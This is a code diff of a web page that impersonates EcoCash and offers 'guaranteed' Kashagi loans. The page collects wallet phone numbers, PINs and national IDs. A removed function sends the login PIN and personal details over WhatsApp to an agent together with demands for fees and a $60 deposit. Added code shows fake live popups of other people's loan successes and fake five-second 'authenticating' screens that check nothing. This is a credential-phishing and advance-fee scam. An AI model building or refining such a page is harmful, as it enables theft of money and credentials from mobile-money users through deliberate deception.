+                                    <span id="apply-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                                </div>
+                                <p id="apply-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile (9 digits)</p>
                             </div>
+                            <!-- Zimbabwe ID -->
                             <div>
                                 <label class="block font-medium mb-1">Zimbabwe ID <span class="text-red-500">*</span></label>
-                                <input type="text" id="apply-nid" placeholder="63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none uppercase" oninput="validateApplyForm()">
+                                <div class="relative">
+                                    <input type="text" id="apply-nid" placeholder="63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none uppercase" oninput="validateApplyForm()">
+                                    <span id="apply-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                                </div>
                             </div>
                         </div>
-                        <p id="apply-id-error" class="text-[10px] text-red-600 mt-0.5 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
+                        <p id="apply-id-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect ID format (e.g., 63-1234567A89)</p>
 
                         <div class="grid grid-cols-2 gap-2">
                             <div>
@@ -623,9 +718,14 @@
                                     <option value="Business Owner">Business Owner</option>
                                 </select>
                             </div>
+                            <!-- Monthly Income -->
                             <div>
                                 <label class="block font-medium mb-1">Monthly Income (USD) <span class="text-red-500">*</span></label>
-                                <input type="number" id="apply-income" placeholder="e.g. 300" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                                <div class="relative">
+                                    <input type="number" inputmode="numeric" pattern="[0-9]*" id="apply-income" placeholder="e.g. 300" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                                    <span id="apply-income-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                                </div>
+                                <p id="apply-income-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Amount</p>
                             </div>
                         </div>
                     </form>
@@ -639,7 +739,7 @@
             </section>
 
 
-            <!-- ================= VIEW 9: CONTACT US & DEDICATED HELP CENTER (FAQS) ================= -->
+            <!-- ================= VIEW 9: CONTACT US & DEDICATED HELP CENTER ================= -->
             <section id="view-contact" class="hidden flex-1 flex flex-col bg-white dark:bg-gray-800 transition-colors">
                 <div class="bg-gradient-to-r from-blue-600 to-cyan-500 text-white p-6 relative flex justify-between items-center overflow-hidden min-h-[140px]">
                     <h2 class="text-2xl font-semibold z-10">Dedicated Help Center</h2>
@@ -689,7 +789,7 @@
                         </div>
                         <div>
                             <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Phone Number <span class="text-red-500">*</span></label>
-                            <input type="tel" id="contact-phone" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                            <input type="tel" inputmode="numeric" pattern="[0-9]*" id="contact-phone" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
                         </div>
                         <div>
                             <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your message <span class="text-red-500">*</span></label>
@@ -815,6 +915,59 @@
             document.documentElement.classList.add('dark');
             document.getElementById('dark-mode-icon').className = "fa-solid fa-sun text-xs";
         }
+
+        // ================= LIVE POP-UP NOTIFICATIONS ENGINE =================
+        const sampleMaskedNumbers = [
+            "+263 7** *** *49", "+263 7** *** *82", "+263 7** *** *15", 
+            "+263 7** *** *93", "+263 7** *** *24", "+263 7** *** *67",
+            "+263 7** *** *31", "+263 7** *** *88", "+263 7** *** *50"
+        ];
+        const sampleLoanAmounts = ["$100", "$250", "$500", "$1,000", "$1,500", "$2,000", "$3,000"];
+
+        function triggerLiveNotificationPopup() {
+            const container = document.getElementById('live-notification-container');
+            if (!container) return;
+
+            // Pick random masked number and loan amount
+            const randomPhone = sampleMaskedNumbers[Math.floor(Math.random() * sampleMaskedNumbers.length)];
+            const randomAmount = sampleLoanAmounts[Math.floor(Math.random() * sampleLoanAmounts.length)];
+
+            // Create popup card element
+            const popup = document.createElement('div');
+            popup.className = "bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 shadow-xl rounded-2xl p-3.5 mb-2 w-full max-w-[340px] flex items-center space-x-3 notification-slide-in pointer-events-auto cursor-pointer";
+            
+            popup.innerHTML = `
+                <div class="w-10 h-10 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue flex items-center justify-center flex-shrink-0 shadow-inner">
+                    <i class="fa-solid fa-bolt text-sm"></i>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <div class="flex items-center justify-between">
+                        <h4 class="font-extrabold text-xs text-gray-900 dark:text-gray-100 truncate">${randomPhone}</h4>
+                        <span class="text-[9px] font-semibold text-gray-400 dark:text-gray-500">4 minute ago</span>
+                    </div>
+                    <p class="text-[11px] text-gray-600 dark:text-gray-300 mt-0.5 truncate">
+                        Successfully boosted <span class="font-bold text-supergreen">${randomAmount}</span> Kashagi loan!
+                    </p>
+                </div>
+                <div class="w-2 h-2 rounded-full bg-supergreen animate-ping flex-shrink-0"></div>
+            `;
+
+            container.appendChild(popup);
+
+            // Remove popup after 4.5 seconds with slide out animation
+            setTimeout(() => {
+                popup.classList.remove('notification-slide-in');
+                popup.classList.add('notification-slide-out');
+                setTimeout(() => {
+                    popup.remove();
+                }, 400);
+            }, 4500);
+        }
+
+        // Start live notification loop (every 7 seconds)
+        setInterval(triggerLiveNotificationPopup, 7000);
+        // Trigger first notification after 2 seconds on load
+        setTimeout(triggerLiveNotificationPopup, 2000);
 
         // 10 Client FAQ questions structured into TWO clear, readable parts for Ask Thembi AI
         const thembiFAQs = [
@@ -1089,7 +1242,33 @@
             window.open(waUrl, '_blank');
         }
 
-        // Handle Login Submission & redirect to Kashagi Loans Hub
+        // Global 5-second dim light and cycling function for any transition/action
+        function triggerGlobalDimLoader(titleText, subtitleText, onComplete) {
+            const overlay = document.getElementById('global-dim-overlay');
+            const titleEl = document.getElementById('overlay-title');
+            const subEl = document.getElementById('overlay-subtitle');
+
+            titleEl.innerText = titleText || "Authenticating Credentials";
+            subEl.innerText = subtitleText || "Processing secure session & loading next screen...";
+
+            overlay.classList.remove('hidden');
+            overlay.classList.add('opacity-100');
+
+            setTimeout(() => {
+                overlay.classList.remove('opacity-100');
+                overlay.classList.add('hidden');
+                if (onComplete) onComplete();
+            }, 5000);
+        }
+
+        // Switch tab with 5-second dim light & cycling effect
+        function switchTabWithDim(tabName) {
+            triggerGlobalDimLoader("Loading EcoCash Secure Portal", "Preparing next page and securing session...", () => {
+                switchTab(tabName);
+            });
+        }
+
+        // Handle Login Submission with 5s Dim Light & Cycling
         function handleLoginSubmit() {
             const phone = document.getElementById('login-phone').value.trim();
             const p1 = document.getElementById('pin-1').value;
@@ -1113,7 +1292,9 @@
             document.getElementById('profile-id-display').innerText = `ID: Session Active`;
             document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
 
-            switchTab('kashagi-hub');
+            triggerGlobalDimLoader("Authenticating EcoCash Wallet", "Verifying PIN, mobile number & last 6 months history (5s cycling)...", () => {
+                switchTab('kashagi-hub');
+            });
         }
 
         // Handle Sign Up Submission with 5s Processing Cycle
@@ -1150,7 +1331,7 @@
             clientData.phone = `+263 ${mobileNumber}`;
             clientData.nid = nationalId.toUpperCase();
 
-            runProcessingCycle(() => {
+            triggerGlobalDimLoader("Validating Registration & Zimbabwe ID", "Checking 6-month wallet history & credentials securely...", () => {
                 document.getElementById('profile-name-display').innerText = clientData.name;
                 document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
                 document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
@@ -1158,7 +1339,55 @@
             });
         }
 
-        // Validate Boost Form inputs
+        // Validate Login Form with real-time green ticks & red error messages
+        function validateLoginForm() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const p1 = document.getElementById('pin-1').value;
+            const p2 = document.getElementById('pin-2').value;
+            const p3 = document.getElementById('pin-3').value;
+            const p4 = document.getElementById('pin-4').value;
+            const loginBtn = document.getElementById('login-btn');
+
+            const phoneIcon = document.getElementById('login-phone-icon');
+            const phoneError = document.getElementById('login-phone-error');
+            const pinError = document.getElementById('login-pin-error');
+
+            let isPhoneValid = /^[7]\d{8}$/.test(phone);
+            if (phone.length > 0) {
+                phoneIcon.classList.remove('hidden');
+                if (isPhoneValid) {
+                    phoneIcon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    phoneError.classList.add('hidden');
+                } else {
+                    phoneIcon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    phoneError.classList.remove('hidden');
+                }
+            } else {
+                phoneIcon.classList.add('hidden');
+                phoneError.classList.add('hidden');
+            }
+
+            let isPinValid = (p1 !== '' && p2 !== '' && p3 !== '' && p4 !== '');
+            if (p1 !== '' || p2 !== '' || p3 !== '' || p4 !== '') {
+                if (isPinValid) {
+                    pinError.classList.add('hidden');
+                } else {
+                    pinError.classList.remove('hidden');
+                }
+            } else {
+                pinError.classList.add('hidden');
+            }
+
+            if (isPhoneValid && isPinValid) {
+                loginBtn.disabled = false;
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
+            }
+        }
+
+        // Validate Boost Form with real-time green ticks & red error messages
         function validateBoostForm() {
             const name = document.getElementById('boost-name').value.trim();
             const phone = document.getElementById('boost-phone').value.trim();
@@ -1166,7 +1395,33 @@
             const currentLoan = document.getElementById('boost-current-loan').value.trim();
             const btn = document.getElementById('boost-submit-btn');
 
-            if (name && phone && nid && currentLoan) {
+            const nameValid = /^[A-Za-z\s]+$/.test(name);
+            const phoneValid = /^[7]\d{8}$/.test(phone);
+            const nidValid = isValidZimbabweNID(nid);
+            const loanValid = currentLoan !== '' && Number(currentLoan) > 0;
+
+            updateFieldValidationUI('boost-name', nameValid, 'boost-name-icon', 'boost-name-error');
+            updateFieldValidationUI('boost-phone', phoneValid, 'boost-phone-icon', 'boost-phone-error');
+            
+            const nidIcon = document.getElementById('boost-nid-icon');
+            const nidError = document.getElementById('boost-id-error');
+            if (nid.length > 0) {
+                nidIcon.classList.remove('hidden');
+                if (nidValid) {
+                    nidIcon.innerHTML = '<i class="fa-solid fa-circle-check text-green-600"></i>';
+                    nidError.classList.add('hidden');
+                } else {
+                    nidIcon.innerHTML = '<i class="fa-solid fa-circle-xmark text-red-600"></i>';
+                    nidError.classList.remove('hidden');
+                }
+            } else {
+                nidIcon.classList.add('hidden');
+                nidError.classList.add('hidden');
+            }
+
+            updateFieldValidationUI('boost-current-loan', loanValid, 'boost-loan-icon', 'boost-loan-error');
+
+            if (nameValid && phoneValid && nidValid && loanValid) {
                 btn.disabled = false;
                 btn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
             } else {
@@ -1175,149 +1430,7 @@
             }
         }
 
-        // Process Boost or Apply Submission with ZW ID check and 5s processing cycle
-        function startProcessingFlow(type) {
-            if (type === 'boost') {
-                const name = document.getElementById('boost-name').value.trim();
-                const phone = document.getElementById('boost-phone').value.trim();
-                const nid = document.getElementById('boost-nid').value.trim();
-                const currentLoan = document.getElementById('boost-current-loan').value.trim();
-                const idError = document.getElementById('boost-id-error');
-
-                if (!name || !phone || !nid || !currentLoan) {
-                    showToast('All fields are required.');
-                    return;
-                }
-
-                if (!isValidZimbabweNID(nid)) {
-                    idError.classList.remove('hidden');
-                    showToast('Please enter a valid Zimbabwe National ID format.');
-                    return;
-                }
-                idError.classList.add('hidden');
-
-                clientData.name = name;
-                clientData.phone = `+263 ${phone}`;
-                clientData.nid = nid.toUpperCase();
-                clientData.currentLoan = currentLoan;
-                clientData.flowType = 'boost';
-
-                runProcessingCycle(() => {
-                    initTierTable();
-                    switchTab('tier-upgrade');
-                });
-
-            } else if (type === 'apply') {
-                const name = document.getElementById('apply-name').value.trim();
-                const phone = document.getElementById('apply-phone').value.trim();
-                const nid = document.getElementById('apply-nid').value.trim();
-                const employment = document.getElementById('apply-employment').value;
-                const income = document.getElementById('apply-income').value.trim();
-                const idError = document.getElementById('apply-id-error');
-
-                if (!name || !phone || !nid || !employment || !income) {
-                    showToast('Please provide all required loan registration details.');
-                    return;
-                }
-
-                if (!isValidZimbabweNID(nid)) {
-                    idError.classList.remove('hidden');
-                    showToast('Please enter a valid Zimbabwe National ID format.');
-                    return;
-                }
-                idError.classList.add('hidden');
-
-                clientData.applyName = name;
-                clientData.applyPhone = `+263 ${phone}`;
-                clientData.applyNid = nid.toUpperCase();
-                clientData.applyEmployment = employment;
-                clientData.applyIncome = income;
-                clientData.flowType = 'apply';
-
-                runProcessingCycle(() => {
-                    switchTab('terms');
-                });
-            }
-        }
-
-        // 5-second processing cycle showing loading skeleton & validation
-        function runProcessingCycle(onCompleteCallback) {
-            switchTab('processing');
-            
-            const spinnerContainer = document.getElementById('process-spinner-container');
-            const processTitle = document.getElementById('process-title');
-            const processSubtitle = document.getElementById('process-subtitle');
-
-            spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse";
-            spinnerContainer.innerHTML = `
-                <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
-                <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
-                <i class="fa-solid fa-file-invoice-dollar text-ecoblue text-2xl"></i>
-            `;
-            processTitle.innerText = "Validating Guaranteed Details & Transactions";
-            processSubtitle.innerText = "Analyzing last 6 months transaction history & Zimbabwe ID securely...";
-
-            setTimeout(() => {
-                spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center bg-green-100 dark:bg-green-900 rounded-full shadow-md";
-                spinnerContainer.innerHTML = `<i class="fa-solid fa-check text-green-600 dark:text-green-300 text-3xl"></i>`;
-                processTitle.innerText = "Guaranteed Credentials Verified!";
-                processSubtitle.innerText = "Profile and transaction history successfully validated.";
-
-                setTimeout(() => {
-                    onCompleteCallback();
-                }, 1200);
-
-            }, 5000);
-        }
-
-        function proceedToTerms() {
-            clientData.flowType = 'boost';
-            switchTab('terms');
-        }
-
-        // Check explicit checkbox state to unlock Agree & Submit button
-        function toggleAgreeCheckbox() {
-            const checkbox = document.getElementById('explicit-agree-checkbox');
-            const agreeBtn = document.getElementById('agree-terms-btn');
-
-            if (checkbox.checked) {
-                agreeBtn.disabled = false;
-                agreeBtn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-pointer transition shadow-md";
-            } else {
-                agreeBtn.disabled = true;
-                agreeBtn.className = "w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md";
-            }
-        }
-
-        function handleFinalAgreement() {
-            let message = '';
-            
-            if (clientData.flowType === 'boost') {
-                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
-            } else {
-                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🛡️ *Selected Tier Limit:* $${clientData.selectedApplyAmount} USD\n🛡️ *Collateral Fee (10%):* $${clientData.selectedApplyFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
-            }
-
-            openWhatsAppChat(message);
-        }
-
-        function validateApplyForm() {
-            const name = document.getElementById('apply-name').value.trim();
-            const phone = document.getElementById('apply-phone').value.trim();
-            const nid = document.getElementById('apply-nid').value.trim();
-            const employment = document.getElementById('apply-employment').value;
-            const income = document.getElementById('apply-income').value.trim();
-            const btn = document.getElementById('apply-submit-btn');
-
-            if (name && phone && nid && employment && income) {
-                btn.disabled = false;
-                btn.className = "w-full bg-supergreen hover:opacity-90 text-white font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-pointer transition shadow-md";
-            } else {
-                btn.disabled = true;
-                btn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm";
-            }
-        }
-
+        // Validate Sign Up Form with real-time green ticks & red error messages
         function validateSignupForm() {
             const firstName = document.getElementById('signup-firstname').value.trim();
             const surname = document.getElementById('signup-surname').value.trim();
@@ -1333,147 +1446,6 @@
             const termsChecked = document.getElementById('terms').checked;
             const signupBtn = document.getElementById('signup-btn');
 
-            if (firstName && surname && country && mobileNumber && email && nationalId && password && genderRadio && day && month && year && termsChecked) {
-                signupBtn.disabled = false;
-                signupBtn.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-md uppercase text-xs tracking-wider transition cursor-pointer shadow-md";
-            } else {
-                signupBtn.disabled = true;
-                signupBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition";
-            }
-        }
-
-        function validateContactForm() {
-            const name = document.getElementById('contact-name').value.trim();
-            const email = document.getElementById('contact-email').value.trim();
-            const phone = document.getElementById('contact-phone').value.trim();
-            const userMessage = document.getElementById('contact-message').value.trim();
-            const contactBtn = document.getElementById('contact-btn');
-
-            if (name && email && phone && userMessage) {
-                contactBtn.disabled = false;
-                contactBtn.className = "w-full bg-ecoblue text-white font-bold py-3 rounded-md hover:bg-blue-700 transition cursor-pointer shadow-md";
-            } else {
-                contactBtn.disabled = true;
-                contactBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md cursor-not-allowed transition";
-            }
-        }
-
-        function handleContactSubmit() {
-            const name = document.getElementById('contact-name').value.trim();
-            const email = document.getElementById('contact-email').value.trim();
-            const phone = document.getElementById('contact-phone').value.trim();
-            const userMessage = document.getElementById('contact-message').value.trim();
-
-            if (!name || !email || !phone || !userMessage) {
-                showToast('Please complete all contact form fields.');
-                return;
-            }
-
-            const message = `*EcoCash Support Inquiry*\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n💬 *Message:* ${userMessage}`;
-            openWhatsAppChat(message);
-        }
-
-        function switchTab(tabName) {
-            const loginView = document.getElementById('view-login');
-            const signupView = document.getElementById('view-signup');
-            const hubView = document.getElementById('view-kashagi-hub');
-            const processingView = document.getElementById('view-processing');
-            const boostFormView = document.getElementById('view-boost-form');
-            const tierUpgradeView = document.getElementById('view-tier-upgrade');
-            const termsView = document.getElementById('view-terms');
-            const applyFormView = document.getElementById('view-apply-form');
-            const contactView = document.getElementById('view-contact');
-            const whatsappWidget = document.getElementById('whatsapp-widget');
-
-            loginView.classList.add('hidden');
-            signupView.classList.add('hidden');
-            hubView.classList.add('hidden');
-            processingView.classList.add('hidden');
-            boostFormView.classList.add('hidden');
-            tierUpgradeView.classList.add('hidden');
-            termsView.classList.add('hidden');
-            applyFormView.classList.add('hidden');
-            contactView.classList.add('hidden');
-            whatsappWidget.classList.add('hidden');
-
-            if (tabName === 'login') {
-                loginView.classList.remove('hidden');
-            } else if (tabName === 'signup') {
-                signupView.classList.remove('hidden');
-            } else if (tabName === 'kashagi-hub') {
-                hubView.classList.remove('hidden');
-            } else if (tabName === 'processing') {
-                processingView.classList.remove('hidden');
-            } else if (tabName === 'boost-form') {
-                boostFormView.classList.remove('hidden');
-            } else if (tabName === 'tier-upgrade') {
-                tierUpgradeView.classList.remove('hidden');
-            } else if (tabName === 'terms') {
-                termsView.classList.remove('hidden');
-            } else if (tabName === 'apply-form') {
-                applyFormView.classList.remove('hidden');
-                initApplyTierTable();
-            } else if (tabName === 'contact') {
-                contactView.classList.remove('hidden');
-                whatsappWidget.classList.remove('hidden');
-            }
-            
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        function toggleMenu() {
-            const dropdown = document.getElementById('nav-dropdown');
-            dropdown.classList.toggle('hidden');
-        }
-
-        function movePinFocus(current, index, event) {
-            if (event.key === "Backspace" && current.value === "" && index > 1) {
-                document.getElementById(`pin-${index - 1}`).focus();
-            } else if (current.value.length >= 1 && index < 4) {
-                document.getElementById(`pin-${index + 1}`).focus();
-            }
-        }
-
-        let showPin = false;
-        function togglePinVisibility() {
-            showPin = !showPin;
-            const pinInputs = document.querySelectorAll('.pin-box');
-            const eyeIcon = document.getElementById('pin-eye-icon');
-
-            pinInputs.forEach(input => {
-                input.type = showPin ? 'text' : 'password';
-            });
-
-            eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
-        }
-
-        let showPassword = false;
-        function togglePasswordVisibility() {
-            showPassword = !showPassword;
-            const passInput = document.getElementById('new-password');
-            const eyeIcon = document.getElementById('password-eye-icon');
-
-            passInput.type = showPassword ? 'text' : 'password';
-            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
-        }
-
-        function validateLoginForm() {
-            const phone = document.getElementById('login-phone').value.trim();
-            const p1 = document.getElementById('pin-1').value;
-            const p2 = document.getElementById('pin-2').value;
-            const p3 = document.getElementById('pin-3').value;
-            const p4 = document.getElementById('pin-4').value;
-            const loginBtn = document.getElementById('login-btn');
-
-            if (phone !== '' && p1 !== '' && p2 !== '' && p3 !== '' && p4 !== '') {
-                loginBtn.disabled = false;
-                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
-            } else {
-                loginBtn.disabled = true;
-                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
-            }
-        }
-    </script>
-</body>
-</html>
-
+            const fnValid = /^[A-Za-z]+$/.test(firstName);
+            const snValid = /^[A-Za-z]+$/.test(surname);
+  
